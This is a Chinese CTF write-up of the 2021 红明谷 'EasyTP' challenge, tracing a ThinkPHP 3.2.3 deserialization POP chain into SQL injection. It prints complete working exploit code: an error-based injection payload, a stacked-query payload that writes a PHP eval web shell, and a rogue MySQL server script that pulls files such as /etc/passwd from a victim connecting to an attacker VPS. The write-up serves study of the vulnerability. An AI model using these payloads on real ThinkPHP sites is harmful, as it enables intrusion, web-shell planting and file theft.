---
title: 红明谷CTF2021-EasyTP
date: 2026-04-14 19:29:42
tags:
- sql注入
- 恶意mysql
category:
- 刷题笔记
---

# 红明谷CTF2021-EasyTP

## 解题

访问www.zip可以下载到源码

发现是thinkphp，查看ThinkPHP.php可以看到版本是3.2.3

上网搜一下发现

TP3.2.3有两个漏洞:

- 日志泄露: Application/Runtime/Logs/Home/年份_月份_日期.log
- SQL注入: Chain: __destruct()->destroy()->delete()->Driver::delete()->Driver::execute()->Driver::initConnect()->Driver::connect()->

---

这里肯定是要SQL注入拿到flag了

直接网上查现成的poc

### 解法1：报错注入

```
<?php
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true // 开启才能读取文件
        );
        protected $config = array(
            "debug"    => true,
            "database" => "test", // 可换成任一存在的库
            "hostname" => "127.0.0.1",
            "hostport" => "3306",
            "charset"  => "utf8",
            "username" => "root",
            "password" => "root" // BUU环境密码为root
        );
    }
}
namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
        private $img;
        public function __construct(){
            $this->img = new Memcache();
        }
    }
}
namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
        protected $handle;
        public function __construct(){
            $this->handle = new Model();
        }
    }
}
namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
        protected $options = array();
        protected $pk;
        protected $data = array();
        protected $db = null;
        public function __construct(){
            $this->db = new Mysql();
            $this->options['where'] = '';
            $this->pk = 'id';
            $this->data[$this->pk] = array(
                //查看数据库名称
                // "table" => "mysql.user where updatexml(1,concat(0x7e,mid((select(group_concat(schema_name))from(information_schema.schemata)),30),0x7e),1)#",
                //数据库名称：'~information_schema,mysql,performance_schema,sys,test~'
                //一次能够读取的长度有限，分两次读取数据  使用mid函数分开读取

                //查表名
                // "table" => "mysql.user where updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#",
                // ~flag,users~

                // 查列名
                //"table" => "mysql.user where updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),0x7e),1)#",
                //~flag~

                //查字段值
                "table" => "mysql.user where updatexml(1,concat(0x7e,mid((select`*`from`flag`),1),0x7e),1)#",
                "where" => "1=1"
                
            );
        }
    }
}
namespace {
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
}


```

其中报错注入的部分,注意updatexml 最多只能显示**32位**,可以使用substr 或者reverse来进行搭配使用，而师傅的wp中采用mid()函数进行部分截取

利用控制器中的`php://input`进行post传入数据

flag长度过长，分开查，查看前半段flag

```
mysql.user where updatexml(1,concat(0x7e,mid((select`*`from`flag`),1),0x7e),1)#
```

查看后半段flag

```
mysql.user where updatexml(1,concat(0x7e,mid((select`*`from`flag`),15),0x7e),1)#
```

拼接即可得到最终的flag

### 解法2：开堆叠写shell

```
<?php
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true,    //读取本地文件~
            PDO::MYSQL_ATTR_MULTI_STATEMENTS => true,    //把堆叠开了~
        );
        protected $config = array(
            "debug"    => 1,
            "database" => "test",//任意一个存在的数据库
            "hostname" => "127.0.0.1",
            "hostport" => "3306",
            "charset"  => "utf8",
            "username" => "root",
            "password" => "root"
        );
    }
}
namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
        private $img;
        public function __construct(){
            $this->img = new Memcache();
        }
    }
}
namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
        protected $handle;
        public function __construct(){
            $this->handle = new Model();
        }
    }
}
namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
        protected $options   = array();
        protected $pk;
        protected $data = array();
        protected $db = null;
        public function __construct(){
            $this->db = new Mysql();
            $this->options['where'] = '';
            $this->pk = 'id';
            $this->data[$this->pk] = array(
                "table" => "mysql.user where 1=1;select '<?php eval(\$_POST[1]);?>' into outfile '/var/www/html/shell.php';#",
                "where" => "1=1"
            );
        }
    }
}
namespace {
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));


    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => "http://60255871-6897-49ef-9d6c-884e6aa201d0.node4.buuoj.cn:81/index.php/Home/Index/test",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_POSTFIELDS => base64_encode(serialize(new Think\Image\Driver\Imagick())),
        CURLOPT_HTTPHEADER => array(
            "Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e",
            "cache-control: no-cache"
        ),
    ));
    $response = curl_exec($curl);
    $err = curl_error($curl);
    curl_close($curl);
    if ($err) {
        echo "cURL Error #:" . $err;
    } else {
        echo $response;
    }
}

```

查看根目录的文件，发现flag是插入进数据库中的

flag.sh

start.sh

根据这个shell直接用蚁剑连接数据库，数据库类型选择MYSQLI,账号密码都为root

### 解法3：rogue-mysql-server

在vps上起一个恶意的server,模拟mysql服务端的身份验证 过程，骗取客户端（也就是靶机）将其信息发给靶机

使用的是`roguemysql.php`，注意修改其中的端口（因为可能vps上已经有mysql在3306端口了，我们的这个恶意的mysql的server端要占一个端口，这里我用的是3307端口，注意把vps的防火墙 打开）

```
<?php
function unhex($str) { return pack("H*", preg_replace('#[^a-f0-9]+#si', '', $str)); }

$filename = "/etc/passwd";

$srv = stream_socket_server("tcp://0.0.0.0:3307");

while (true) {
  echo "Enter filename to get [$filename] > ";
  $newFilename = rtrim(fgets(STDIN), "\r\n");
  if (!empty($newFilename)) {
    $filename = $newFilename;
  }

  echo "[.] Waiting for connection on 0.0.0.0:3307\n";
  $s = stream_socket_accept($srv, -1, $peer);
  echo "[+] Connection from $peer - greet... ";
  fwrite($s, unhex('45 00 00 00 0a 35 2e 31  2e 36 33 2d 30 75 62 75
                    6e 74 75 30 2e 31 30 2e  30 34 2e 31 00 26 00 00
                    00 7a 42 7a 60 51 56 3b  64 00 ff f7 08 02 00 00
                    00 00 00 00 00 00 00 00  00 00 00 00 64 4c 2f 44
                    47 77 43 2a 43 56 63 72  00                     '));
  fread($s, 8192);
  echo "auth ok... ";
  fwrite($s, unhex('07 00 00 02 00 00 00 02  00 00 00'));
  fread($s, 8192);
  echo "some shit ok... ";
  fwrite($s, unhex('07 00 00 01 00 00 00 00  00 00 00'));
  fread($s, 8192);
  echo "want file... ";
  fwrite($s, chr(strlen($filename) + 1) . "\x00\x00\x01\xFB" . $filename);
  stream_socket_shutdown($s, STREAM_SHUT_WR);
  echo "\n";

  echo "[+] $filename from $peer:\n";

  $len = fread($s, 4);
  if(!empty($len)) {
    list (, $len) = unpack("V", $len);
    $len &= 0xffffff;
    while ($len > 0) {
      $chunk = fread($s, $len);
      $len -= strlen($chunk);
      echo $chunk;
    }
  }

  echo "\n\n";
  fclose($s);
}

```

同时需要让靶机来连接我们vps上的这个恶意的server才行，所以修改了一下上面的payload中的ip 和port

```
<?php
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true,    // 开启才能读取文件
        );
        protected $config = array(
            "debug"    => 1,
            "database" => "test",//任意一个存在的数据库
            "hostname" => "xxx.xx.xx.xx", //公网ip
            "hostport" => "3307",
            "charset"  => "utf8",
            "username" => "root",
            "password" => "root"
        );
    }
}
```

准备之后开始操作

先开启恶意的mysql_server服务

```
php roguemysql.php
```

可以输入/etc/passwd来测试

然后burpsuite发包，反序列化触发执行让靶机连接我们的恶意server

---

# pop链

## 寻找反序列化入口

首先全局搜索反序列化入口`__destruct`

找到起点，`\tp3\ThinkPHP\Library\Think\Image\Driver\Imagick.class.php`

```
    public function __destruct() {
        empty($this->img) || $this->img->destroy();
    }
```

其中$this->img是可控的，调用了destroy函数，这里全局搜索`function destroy`，跟进到

`\tp3\ThinkPHP\Library\Think\Session\Driver\Memcache.class.php,`

```
	public function destroy($sessID) {
		return $this->handle->delete($this->sessionName.$sessID);
	}
```

其中的**$this->handle**和**$this->sessionName**是可控的,然后调用了**delete**函数，跟进到`ThinkPHP/Mode/Lite/Model.class.php`

```
public function delete($options=array()) {
        $pk   =  $this->getPk();
        if(empty($options) && empty($this->options['where'])) {
            // 如果删除条件为空 则删除当前数据对象所对应的记录
            if(!empty($this->data) && isset($this->data[$pk]))
                return $this->delete($this->data[$pk]);
            else
                return false;
        }
        if(is_numeric($options)  || is_string($options)) {
            // 根据主键删除记录
            if(strpos($options,',')) {
                $where[$pk]     =  array('IN', $options);
            }else{
                $where[$pk]     =  $options;
            }
            $options            =  array();
            $options['where']   =  $where;
        }
        // 根据复合主键删除记录
        if (is_array($options) && (count($otions) > 0) && is_array($pk)) {
            $count = 0;
            foreach (array_keys($options) as $key) {
                if (is_int($key)) $count++; 
            } 
            if ($count == count($pk)) {
                $i = 0;
                foreach ($pk as $field) {
                    $where[$field] = $options[$i];
                    unset($options[$i++]);
                }
                $options['where']  =  $where;
            } else {
                return false;
            }
        }
        // 分析表达式
        $options =  $this->_parseOptions($options);
        if(empty($options['where'])){
            // 如果条件为空 不进行删除操作 除非设置 1=1
            return false;
        }        
        if(is_array($options['where']) && isset($options['where'][$pk])){
            $pkValue            =  $options['where'][$pk];
        }

        if(false === $this->_before_delete($options)) {
            return false;
        }        
        $result  =    $this->db->delete($options);
        if(false !== $result && is_numeric($result)) {
            $data = array();
            if(isset($pkValue)) $data[$pk]   =  $pkValue;
            $this->_after_delete($data,$options);
        }
        // 返回删除记录个数
        return $result;
    }
```

这里调用了getPk函数

```
    public function getPk() {
        return $this->pk;
    }
```

**$this->pk**可控，所以**$pk**是可控的，接着看下面

```
return $this->delete($this->data[$pk]);
```

再次调用**delete**函数,这次跟进到`ThinkPHP/Library/Think/Db/Driver.class.php`

```
public function delete($options=array()) {
        $this->model  =   $options['model'];
        //将$options['model']的值赋给model成员属性
        $this->parseBind(!empty($options['bind'])?$options['bind']:array());
        //若传入的option数组中有bind键，就将bind键的值合并到bind成员属性上
        $table  =   $this->parseTable($options['table']);
        //将option[table]的值解析到变量table中，且是以逗号分隔，存储的是表名
        $sql    =   'DELETE FROM '.$table;
        //将表名拼接到sql语句中
        if(strpos($table,',')){// 多表删除支持USING和JOIN操作
            if(!empty($options['using'])){
                $sql .= ' USING '.$this->parseTable($options['using']).' ';
            }
            $sql .= $this->parseJoin(!empty($options['join'])?$options['join']:'');
        }
        //这个没必要看
        $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:'');
        //拼接限制条件，如果option[where]存在的话
        if(!strpos($table,',')){
            // 单表删除支持order和limit
            $sql .= $this->parseOrder(!empty($options['order'])?$options['order']:'')
            .$this->parseLimit(!empty($options['limit'])?$options['limit']:'');
        }
        //判断是否为单表操作，如果是那就拓展order和limit限制约束
        $sql .=   $this->parseComment(!empty($options['comment'])?$options['comment']:'');
        //拼接注释
        return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);
        //调用$this->execute方法执行SQL语句
    }
```

关键的是这段代码

```php
Copy$table = $this->parseTable($options['table']);
$sql   = 'DELETE FROM ' . $table;
...
return $this->execute($sql, !empty($options['fetch_sql']) ? true : false);
```

**$sql**是由**'DELETE FROM '**与**$table**拼接而来的，而**$table**等于的是调用了**parseTable**方法后的值

我们继续跟进paresTable方法

```
 protected function parseTable($tables) {
        if(is_array($tables)) {// 支持别名定义
            $array   =  array();
            foreach ($tables as $table=>$alias){
                if(!is_numeric($table))
                    $array[] =  $this->parseKey($table).' '.$this->parseKey($alias);
                else
                    $array[] =  $this->parseKey($alias);
            }
            $tables  =  $array;
        }elseif(is_string($tables)){
            $tables  =  explode(',',$tables);
            array_walk($tables, array(&$this, 'parseKey'));
        }
        return implode(',',$tables);
    }
```

调用了**parseKey**方法，跟进

```
    protected function parseKey(&$key) {
        return $key;
    }
```

直接返回**$key**，退回到`ThinkPHP/Library/Think/Db/Driver.class.php`中的**delete**方法

最后调用了**execute**方法对**$sql**进行处理

```
return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);
```

跟进一下

```
    public function execute($str,$fetchSql=false) {
        $this->initConnect(true);
        if ( !$this->_linkID ) return false;
```

调用了**initConnect**方法，跟进

```
    protected function initConnect($master=true) {
        if(!empty($this->config['deploy']))
            // 采用分布式数据库
            $this->_linkID = $this->multiConnect($master);
        else
            // 默认单数据库
            if ( !$this->_linkID ) $this->_linkID = $this->connect();
    }
```

调用了**connect**函数，跟进

```
    public function connect($config='',$linkNum=0,$autoConnection=false) {
        if ( !isset($this->linkID[$linkNum]) ) {
            if(empty($config))  $config =   $this->config;
            try{
                if(empty($config['dsn'])) {
                    $config['dsn']  =   $this->parseDsn($config);
                }
                if(version_compare(PHP_VERSION,'5.3.6','<=')){ 
                    // 禁用模拟预处理语句
                    $this->options[PDO::ATTR_EMULATE_PREPARES]  =   false;
                }
                $this->linkID[$linkNum] = new PDO( $config['dsn'], $config['username'], $config['password'],$this->options);
            }catch (\PDOException $e) {
                if($autoConnection){
                    trace($e->getMessage(),'','ERR');
                    return $this->connect($autoConnection,$linkNum);
                }elseif($config['debug']){
                    E($e->getMessage());
                }
            }
        }
        return $this->linkID[$linkNum];
    }
```

这里使用了**$this->config**去创建数据库的连接，所以在**mysql**类下配置好数据库的配置即可

```
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true    // 开启才能读取文件
        );
        protected $config = array(
            "debug"    => 1,
            "database" => "test",
            "hostname" => "127.0.0.1",
            "hostport" => "3306",
            "charset"  => "utf8",
            "username" => "root",
            "password" => "root"
        );
    }
}
```

梳理一下思路

```
//ThinkPHP/Mode/Lite/Model.class.php
protected $data = array();
protected $pk = 'id';
...
$pk = $this->getPk();    
return $this->delete($this->data[$pk]);//$pk可控，$this->data可控，所以$this->data[$pk]可控


//ThinkPHP/Library/Think/Db/Driver.class.php
public function delete($options = array())//这里的$options就是上面的$this->data[$pk]，可控
$table = $this->parseTable($options['table']);
$sql   = 'DELETE FROM ' . $table;
return $this->execute($sql, !empty($options['fetch_sql']) ? true : false);


 protected function parseTable($tables)
    {
        if (is_array($tables)) {
// 支持别名定义
            $array = array();
            foreach ($tables as $table => $alias) {
                if (!is_numeric($table)) {
                    $array[] = $this->parseKey($table) . ' ' . $this->parseKey($alias);
                } else {
                    $array[] = $this->parseKey($alias);
                }

            }
            $tables = $array;
        } elseif (is_string($tables)) {
            $tables = explode(',', $tables);
            array_walk($tables, array(&$this, 'parseKey'));
        }
        return implode(',', $tables);
    }


 
 protected function parseKey(&$key)
    {
        return $key;
    }

```

对于整个执行过程可以看下面的例子

```
<?php
class wind
{
    public $data = array();
    public $pk;
    public function test()
    {
        $pk = $this->pk;
        return $this->delete($this->data[$pk]);
    }
    public function delete($options = array()) //这里的$options就是上面的$this->data[$pk]，可控
    {
        $table = $this->parseTable($options['table']);
        var_dump($table);
    }
    public function __construct()
    {
        $this->pk = 'id';
        $this->data[$this->pk] = array(
            "table" => "test sql",
        );
    }
    public function parseKey(&$key)
    {
        return $key;
    }
    public function parseTable($tables)
    {
        if (is_array($tables)) {
// 支持别名定义
            $array = array();
            foreach ($tables as $table => $alias) {
                if (!is_numeric($table)) {
                    $array[] = $this->parseKey($table) . ' ' . $this->parseKey($alias);
                } else {
                    $array[] = $this->parseKey($alias);
                }

            }
            $tables = $array;
            print_r($tables);
        } elseif (is_string($tables)) {
            $tables = explode(',', $tables);
            array_walk($tables, array(&$this, 'parseKey'));
        }
        return implode(',', $tables);
    }
}
$a=new wind();
$a->test();

//输出结果：
string(8) "test sql"
```

所以我们可以构造

```
$this->data[$this->pk] = array(
                "table" => "name where 1=updatexml(1,user(),1)#",
                "where" => "1=1"
```

来进行报错注入

### 总结

> **链子**：
>
> `/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php`:: `__destruct()` =>
>
> `/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php` :: `destroy()` =>
>
> `/ThinkPHP/Library/Think/Model.class.php` :: `delete()` =>
>
> ```
> /ThinkPHP/Library/Think/Db/Driver.class.php` :: `delete()
> ```







